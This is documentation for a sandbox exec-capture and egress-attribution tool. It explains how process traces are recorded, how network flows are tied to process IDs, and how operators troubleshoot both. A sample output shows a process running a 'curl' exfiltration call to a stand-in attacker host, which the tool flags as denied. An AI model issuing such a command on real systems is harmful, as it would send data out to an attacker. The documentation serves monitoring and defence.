# Exec capture: what a sandbox ran, and which process reached a host

`km-netpolicy execs | who | execs save` let a sandbox report what it actually
ran — every process, not just what a human typed at a prompt — and join that
trace against the egress census (`docs/egress-census.md`) to answer "which
process reached this host".

**Provisioned on every sandbox, unconditionally**, in its own daemon
(`km-execlog.service`) outside the network-enforcement conditional. See
"Why its own daemon" below for why that separation matters.

## The problem this closes

`_km_audit` (the `PROMPT_COMMAND` hook in `/etc/profile.d/km-audit.sh`) records
exactly one class of thing: a command a human typed at an interactive shell.
Every process an agent spawns — `git`, `python`, `curl`, `rg`, anything a tool
calls, and everything those call in turn — is invisible to it. On an
autonomous box, which is what km exists to run, that is nearly all activity on
the machine.

Phase 131 shipped the network half of this: `km-netpolicy observed|flows`
reports every egress decision a sandbox has made. Exec capture is the process
half. Together they answer the question an operator actually asks after an
agentic run: not just "where did you go" but "what were you running when you
went there".

## The four verbs

```
km-netpolicy execs [--since 10m] [--uid N] [--failed] [--json]
km-netpolicy who <host>
km-netpolicy execs save
```

(`execs-daemon` is a fourth, hidden verb — it is what `km-execlog.service`
runs, not something an operator invokes directly.)

### `execs`

Lists what the sandbox executed, newest last:

```console
$ km-netpolicy execs --since 10m
14:02:03  uid=1000  pid=4211   ppid=4180   git clone --depth 1 https://github.com/capitalone/VulnHunter /workspace/VulnHunter
14:02:11  uid=1000  pid=4299   ppid=4211   curl -s https://api.github.com/repos/capitalone/VulnHunter
14:03:40  uid=0     pid=4501   ppid=4498   sudo yum install -y nmap
14:03:41  uid=0     pid=4502   ppid=4501   /usr/bin/yum install -y nmap
14:05:02  uid=1000  pid=4610   ppid=4180   /usr/bin/nosuchtool --scan  [FAILED ret=2]
```

`--since 10m` filters by timestamp; `--uid N` filters by the executing uid;
`--failed` shows only non-zero exits; `--json` emits one JSON object per line
matching the on-disk record, for a consumer that wants to parse it rather than
read it. An empty result prints `(none)` on the human-readable path — `--json`
never prints that marker, since a consumer treating stdout as zero-or-more
JSON lines would have to strip it back out.

A failed exec is marked `[FAILED ret=N]` rather than left as a bare number —
an agent reaching for a binary that is not installed, or one it is not
permitted to run, is a finding, not noise, and the design deliberately records
failed execs rather than dropping them.

### `who <host>`

The verb that justifies the phase. It reads both stores and correlates a flow
to the process that made it:

```console
$ km-netpolicy who evil.example.com
14:05:02  deny     http     evil.example.com  ← pid=4610 curl -s https://evil.example.com/exfil

$ km-netpolicy who api.anthropic.com
14:02:11  allow    http     api.anthropic.com:443  ← pid=4299 curl -s https://api.anthropic.com/v1/messages
```

**Attribution comes from the HTTP proxy, not the eBPF ring buffer.** The
sandbox user's `HTTPS_PROXY` env var sends nearly all agent egress to the
proxy explicitly, over loopback — by the time that connection reaches the
kernel's `connect4` program it is already a loopback hop to `127.0.0.1`
carrying no destination worth recording, and `connect4` emits nothing for it
at all. The proxy is the component that actually terminates the agent's
connection, so it is the one that has to resolve the pid:
`sidecars/http-proxy/httpproxy/pidresolve.go` walks two pinned BPF maps in
the direction opposite `transparent.go`'s original-destination lookup — the
connection's local TCP source port through `src_port_to_sock` (port → socket
cookie, populated by the `sockops` program on every accepted connection),
then `socket_pid_map` (cookie → pid, populated by `connect4` on **every**
invocation, before any allow/deny decision is even made) — and `recordFlow`
(the single chokepoint in `proxy.go`) stamps the result onto every flow
record it writes. That happens **regardless of verdict**: an allowed
connection through the proxy is now just as attributable as a denied or
redirected one, which is a real loosening of how this used to work.

**This needs the eBPF programs loaded — `spec.network.enforcement: ebpf` or
`both`.** `km-http-proxy` itself runs under all three enforcement modes, but
the two pinned maps it reads only exist once `km-ebpf-enforcer` has started
and pinned them. Under `proxy` — the schema default — there is no BPF loaded
at all, so there is nothing to resolve against and every flow the proxy
records carries no pid, unconditionally.

**Resolution fails soft everywhere, on purpose.** An absent pin directory
(proxy-only enforcement, or the enforcer hasn't started yet), a map miss, or
any lookup error all resolve to "no pid" — never a blocked request, never a
dropped flow record. A load failure logs once per process lifetime, not once
per connection (`http_proxy_pid_resolution_unavailable` in the http-proxy
journal — a box running pure `proxy` enforcement would otherwise log it
forever).

**One case is still exactly as narrow as it always was: traffic that never
reaches the proxy at all.** Something that opens a raw socket instead of
respecting `HTTPS_PROXY` is seen only by the eBPF ring buffer, and
`pkg/ebpf/bpf.c`'s `emit_event` fires only on `ACTION_DENY`/`ACTION_REDIRECT`
— the `connect4` **allow** path deliberately emits no event at all (one event
per allowed connection is real CloudWatch volume). So a non-proxied allowed
connection still produces no flow record whatsoever, pid or otherwise. That
is the one piece of the original "allow is never attributable" limitation
that is still literally true — it just no longer describes proxied traffic,
which is nearly everything an agent does:

```console
$ km-netpolicy who api.github.com
14:05:40  allow    resolver api.github.com  ← (no pid on this flow)

None of these flows could be attributed to a process.
A flow only carries a pid when it was DENIED or REDIRECTED — the
allowed-connection path records no pid (and, under ebpf/both, often
no flow at all). So an ALLOWED connection is never attributable, even
on a box already running spec.network.enforcement: ebpf or both — this
is expected, not a sign the feature is broken. The exec trace itself
is complete regardless — see `km-netpolicy execs`.
```

That printed explanation predates the proxy-side fix and still only names the
deny/redirect narrowing — even on a box where the real cause is `proxy`
enforcement having no BPF pins at all. Both produce the identical empty
result, but the message names only one of the two causes; if you're staring
at it on a `proxy`-enforcement box, the mechanism above still applies, there
are simply zero pins to resolve against. `src=resolver` and `src=dns` rows
never carry a pid either way — those two producers observe a name, never a
socket.

Attribution can also come back partial for a genuinely pid-bearing flow — one
with no matching exec record (rotation discarded it, or the pid's lifetime
window doesn't cover the flow's timestamp) — which prints its own reason
rather than being silently dropped from the listing:

```
14:07:02  deny     ebpf     140.82.113.6:443  ← (no exec recorded for that pid)
```

**Historical note on the numbers themselves:** every `src=ebpf` row recorded
before 2026-08-30 carried a byte-reversed destination IP, and (for
`connect4`-layer events specifically — deny/redirect) a byte-reversed port
too — a `curl https://github.com/` could show up as `3.114.82.140:47873`
instead of `140.82.114.3:443`. Fixed in `d36a727b`; see
`docs/egress-census.md` for the full correction and where else it landed.
Treat any `src=ebpf` address/port pair from before that fix as unreliable.

### `execs save`

Uploads the trace to S3 and prints the URI — **both generations, when a
retained rotated one exists**, each as its own object:

```console
$ km-netpolicy execs save
saved: s3://example-artifacts-123456789012/execs/sb-abc123/execs-20260829T140500Z.jsonl (48213 bytes)
saved: s3://example-artifacts-123456789012/execs/sb-abc123/execs-20260829T140500Z.1.jsonl (16777182 bytes)
```

The reader (`execs`/`who`) reads the live file **and** the retained `.1`
generation, so a save that only uploaded the live one would silently drop
whatever rotation kept on disk the moment a box has rotated once. The two are
never concatenated into a single object — the retained generation is a
separate, older time window, and merging them would misrepresent both. An
absent `.1` (the common case: a box that has never rotated) uploads only the
live generation, exactly as before.

Modelled on `capture stop`'s upload (`docs/egress-census.md`): a Go verb using
the AWS SDK and the instance role, not a bash script. It is named `save`
because km already runs that direction under that name (`km rsync save`).
Best-effort — on failure it says so and the file stays local:

```console
$ km-netpolicy execs save
km-netpolicy execs save: upload failed, trace kept locally at /var/lib/km/execs/execs.jsonl: ...
```

Repeat saves accumulate under `execs/{sandbox_id}/` rather than overwrite, one
timestamped object per save — an earlier save may hold records that rotation
has since discarded from the live file, so overwriting it would be a genuine
loss.

## A behavior change every operator upgrading needs to know about

This surfaced while getting `who` to work at all, but it is bigger than exec
capture and it is not something to bury in a changelog.

cgroup v2 only lets a process migrate itself into a cgroup if it can write the
**common ancestor's** `cgroup.procs`, which is root-owned. Every site that
dispatched an agent turn as the sandbox user did it with `sudo -u sandbox
bash -lc ...`, which lands in `user.slice/…/session-*.scope`, never
`km.slice/km-<id>.scope`. Joining the cgroup *before* the `sudo` doesn't help
either — PAM/logind's session integration migrates the process straight back
out the moment the login session opens. The self-migration these sites
attempted had been failing on every dispatch, silently, behind a
`2>/dev/null || true`.

**The consequence: the eBPF `connect4`/`sendmsg4`/`sockops`/`egress`
programs — the kernel-level enforcement layer — had never run for agent
traffic.** Only an interactive `km shell` session (which joins the cgroup
through `km-session-entry` → `km-sandbox-shell`, not `sudo`) was ever actually
inside it. Every Slack/GitHub/HackerOne/Webhook inbound-poller dispatch and
every `km agent run` / `km at agent run` turn (`km-queue-runner`) ran entirely
outside the enforcement cgroup, for as long as `enforcement: ebpf`/`both`
sandboxes have existed. What actually enforced a profile's allowlist for that
traffic was the DNS resolver (NXDOMAIN, and neither uid- nor cgroup-scoped)
and the HTTP proxy (a plain userspace proxy that applies its allowlist to
every connection it accepts, regardless of which cgroup the connecting
process sits in) — never the BPF layer itself.

Fixed in `0825b8ed` at all 15 dispatch sites, by joining the cgroup as root in
a forked subshell and dropping privileges with `runuser` rather than
`sudo`/`su` — `runuser` never opens a PAM/logind session, so the join
survives.

**This switches BPF enforcement on for agent traffic for the first time.** If
a profile's `allowedDNSSuffixes`/`allowedHosts` were subtly too loose — loose
enough that the DNS resolver and HTTP proxy never caught it, but that the BPF
allow-trie would have — that gap was invisible before this release, and it is
not invisible now. Say this plainly: a box that "worked fine" under
`ebpf`/`both` may behave differently the next time it's recreated, because
for the first time the eBPF layer is actually looking at what an agent does,
not just what a human typed at an interactive prompt.

## Why its own daemon, not the eBPF enforcer

The entire eBPF section of userdata is wrapped in the `enforcement: ebpf` /
`both` conditional. Under `proxy` — the schema default — there is no BPF
loaded, no `km-ebpf-enforcer.service`, and no cgroup at all. Building exec
capture inside `km ebpf-attach` would therefore be **dead in the default mode,
silently** — the same failure shape Phase 131 caught when flow recording was
dead under `proxy` because of a permissions bug nobody could see without
looking.

So capture runs in its own root daemon, `km-execlog.service`, loading only the
execve/exit tracepoints — no cgroup programs, no resolver, no
enforcement — and it is provisioned **outside** the enforcement conditional,
on every sandbox, regardless of mode. A facility that only records what
already happened cannot widen a policy by being present, which is the same
reasoning that makes the egress census itself unconditional.

## The store: root-only, unredacted, capture-everything

`/var/lib/km/execs/execs.jsonl`, JSONL, one record per line, mode `0700` on
the directory and `0600` on the file. Unlike the flow directory (`1777`,
multiple concurrent writers) this store has exactly one producer — the root
exec daemon — so none of that multi-writer reasoning applies, and the
permissions run the opposite direction on purpose:

**argv is recorded unredacted, and that is what forces the store root-only.**
There is no redaction pass — `captures/{sandbox_id}/` in the same artifacts
bucket already receives full packet captures, and a pcap carries strictly
more secret material than argv ever will, so adding a redactor here would
apply a control the more sensitive neighbouring artifact doesn't have. A
redactor that silently under-matches is worse than none, because it implies a
guarantee that doesn't hold. `curl https://x` is the entire value of this
feature; a trace of bare executable names would answer nothing. The direct
consequence: since a `sudo`'d command's argv is captured just like anything
else, a sandbox-readable store would leak root's command lines on exactly the
*unprivileged* profiles that are meant to be the tighter ones. The exec log is
an operator forensics artifact, not something the sandbox user has any reason
to read — reach it via `km shell --root`, or from S3 after a `save`.

**Every exec on the box is captured; the read verbs filter, not the capture
path.** The decisive case is `privileged: true` (`profiles/vulnhunt.yaml` sets
it): the moment a privileged agent `sudo`s, its most interesting activity
*becomes root activity*, and capturing only the sandbox user's uid would blind
the trace to exactly the escalation worth seeing. Scoping capture to the
sandbox cgroup instead would reproduce the same blindness the daemon
separation above exists to avoid, since that cgroup doesn't exist under
`proxy`. Capturing everything also turns "something ran outside the sandbox
user" into a visible signal instead of a blind spot — noise is a read-time
filter (`--uid`); absence is permanent.

## Bounded argv

argv is captured up to `MAX_ARGS = 20` arguments of `ARGSIZE = 128` bytes
each. A command line that exceeds either bound is truncated, and the record
carries `"truncated": true` rather than silently clipping without a trace —
`km-netpolicy execs` renders it as `…[argv truncated]`. This is a hard BPF
loop/stack limit, not a policy choice with room to raise; there is no flag
that widens it.

## Rotation and what two rotations cost

Rotation semantics are copied from `flowlog.Writer`: a 16 MiB cap on the live
file, one retained generation (`execs.jsonl.1`), and a `.rotations` sidecar
counter that survives across rotations. One rotation is harmless — the
previous generation is still on disk and `execs`/`who` both read it. **Two
rotations discard the earliest generation entirely**, and on a sandbox that is
typically the package-install phase near boot — usually the least interesting
window, but the read verbs warn on it rather than silently answering from a
truncated trace:

```
warning: the exec store has rotated 3 times; the earliest execs
(typically the package-install phase) are no longer on disk
```

Check the current count directly:

```console
$ cat /var/lib/km/execs/execs.jsonl.rotations
2
```

## `ExecStop`, and the honest limit on durability

`km-execlog.service` saves on every graceful stop via `ExecStopPost`
(**not** `ExecStop` — for `Type=simple`, systemd runs `ExecStop` *before*
signalling the main process, which would upload the trace before the daemon's
SIGTERM handler drains its final buffered-but-unwritten records to disk;
`ExecStopPost` runs after the process has actually exited, once that drain has
happened). That means `km stop`, `km pause`, and the ACPI shutdown that
precedes an EC2 terminate all save the trace to S3 without anyone having to
remember to run `execs save` by hand.

**A hard power-off still loses the unsaved tail.** `ExecStopPost` only fires
on a graceful stop; nothing here is a durability guarantee for a killed
instance or a kernel panic, and the docs are not going to imply one that
doesn't hold. If you need the current trace preserved *now*, run
`km-netpolicy execs save` yourself — see the known gap below on doing that
by hand from an interactive shell.

**Known gap: a manually-invoked `execs save` has no environment.** The
`km-execlog.service` unit's own `Environment=` lines are what give
`ExecStopPost` its `AWS_REGION`/`KM_ARTIFACTS_BUCKET`/`KM_SANDBOX_ID` —
`/etc/km/netpolicy.env`, which `km shell --root` sources, carries none of
them. Running `km-netpolicy execs save` by hand today fails with
`KM_ARTIFACTS_BUCKET is not set`. Until that's plumbed through, the reliable
way to force a save right now is `sudo systemctl restart km-execlog` (the
outgoing process's `ExecStopPost` saves under the unit's own environment
before the new one starts) rather than invoking the verb directly.

## Not tamper-proof, deliberately

On a `privileged: true` sandbox the agent has sudo and can stop
`km-execlog.service` like any other unit. This is the identical limitation
documented for the Wiz Runtime Sensor (`docs/wiz-sensor.md`): the real control
is `privileged: false`, and detection belongs off-box, not in an on-box daemon
an already-compromised or merely over-eager agent can reach. Exec records also
aren't enrolled in any quota or budget — the only bound on volume is rotation.

## Deploy surface

```bash
make build            # operator binary
make build-lambdas    # create-handler renders the new userdata + the ec2spot IAM change
km init --dry-run=false
```

**Not `--sidecars`.** The `ec2spot` IAM grant (`execs/${sandbox_id}/*` on the
existing `s3:PutObject` statement, `infra/modules/ec2spot/v1.6.0`) needs a
full terragrunt apply, and the userdata that installs `km-execlog.service`
rides in the create-handler zip — `--sidecars` re-uploads sidecar binaries but
does not rebuild that zip.

**Do not split the deploy.** The `km-netpolicy` binary (carrying the new
`execs`/`who`/`execs-daemon` verbs) is uploaded by `buildAndUploadSidecars`;
the unit whose `ExecStart` invokes `execs-daemon` is rendered into userdata by
the create-handler. Ship one half without the other and `km-execlog.service`
crash-loops on an unknown verb — the identical lockstep trap Phase 131
documented for `km ebpf-attach`'s required flags. The full `km init
--dry-run=false` does both halves in one command.

Provisioning is unconditional, so this is not a dormant feature and there is
no byte-identical case: userdata goldens change for every profile.

Existing sandboxes gain nothing until `km destroy && km create` — the unit
and the binary are baked in at boot, not fetched fresh on an already-running
box.

## Troubleshooting

- **`km-netpolicy execs`/`who` print `cannot read exec store ...: permission
  denied`** — the store is `0700` root-only (see above), and this is
  `km-netpolicy` telling you so rather than silently reporting an empty
  trace. Run `km shell --root` and retry.
- **`km-netpolicy execs` prints `(none)` on a box that has clearly done
  things** — first check `journalctl -u km-execlog`. If the unit failed to
  attach its tracepoints (a missing `/sys/kernel/tracing` mount on an
  unusual AMI, for example), it logs there and the store is simply never
  written to. Also check `km-netpolicy execs --failed` isn't hiding the
  answer behind the wrong filter — `execs` with no flags shows everything,
  successes and failures both.
- **`execs --failed` is the first thing to look at on a report of "the agent
  couldn't do X"** — a failed exec is a directly observed cause (missing
  binary, permission denied, a blocked command) rather than something to
  reconstruct from an agent's own account of what happened.
- **Empty trace, unit is `active`** — check for `execlog_write_failed` in the
  journal. The Writer logs its own first write failure exactly once (the same
  discipline `flowlog.Writer` uses, for the same reason: Phase 131's flow
  store failed silently under a permissions bug and nobody noticed for a
  full phase). If that log line is absent, the daemon has never failed a
  write and the trace genuinely is what it says it is.
- **`who <host>` says it can't attribute anything** — there are three
  distinct reasons this happens, and the printed message currently only
  names one of them (see `who <host>` above for the full mechanism): the box
  is on `proxy` enforcement, where the HTTP proxy's own pid resolver has no
  BPF pins to resolve against and every flow carries no pid, regardless of
  verdict; the flows it found never reached the HTTP proxy at all (a raw
  socket that bypassed `HTTPS_PROXY`) and were **allowed** — the eBPF
  ring-buffer path never emits an event for an allowed `connect4`, proxy or
  no proxy; or specific flows have a pid but no matching exec record
  (pid-lifetime window miss, or rotation discarded it). An **allowed**
  connection that *did* go through the proxy on an `ebpf`/`both` box IS
  attributable today — that's the whole point of the proxy-side fix — so if
  `who` comes back empty for one, check which of the three reasons above
  actually applies before assuming the feature doesn't work for allows.
- **A kernel-side ring-buffer drop is invisible to this tool.** `cilium/ebpf`
  exposes no drop counter for `BPF_MAP_TYPE_RINGBUF`, so the tracer can only
  detect a **stalled consumer** (its own drain loop falling behind), logged
  once as `exec_tracer_consumer_stalled`. A drop that never stalls the
  consumer — a genuine kernel-side loss under extreme burst — leaves no trace
  anywhere. Say this plainly rather than imply a coverage guarantee the
  mechanism can't back up.
- **`execs save` says the upload failed** — the trace is still on disk at
  `/var/lib/km/execs/execs.jsonl`; retry, or read it via `km shell --root`.
  Check `AWS_REGION` is set in the unit's environment first — an unset region
  fails the AWS SDK with "Invalid region: region was not a valid DNS name",
  which reads as a bucket problem rather than a config one (the same trap
  `km-capture.service` hit and was fixed for in commit `216d4664`).
- **`km-netpolicy execs save` run by hand exits `KM_ARTIFACTS_BUCKET is not
  set`** — this is a currently-open gap, not a misconfiguration on your box.
  The verb reads its S3 target straight from the environment, and that
  environment only exists inside the `km-execlog.service` unit; an
  interactive `km shell --root` session has none of it. `sudo systemctl
  restart km-execlog` forces the same save through `ExecStopPost` instead.

See `.planning/phases/132-exec-capture/132-UAT.md` for the full live-UAT
record (VulnHunter vs. `defcon.run.34`) and
`docs/superpowers/specs/2026-08-29-exec-capture-design.md` for the design
rationale behind every decision above.
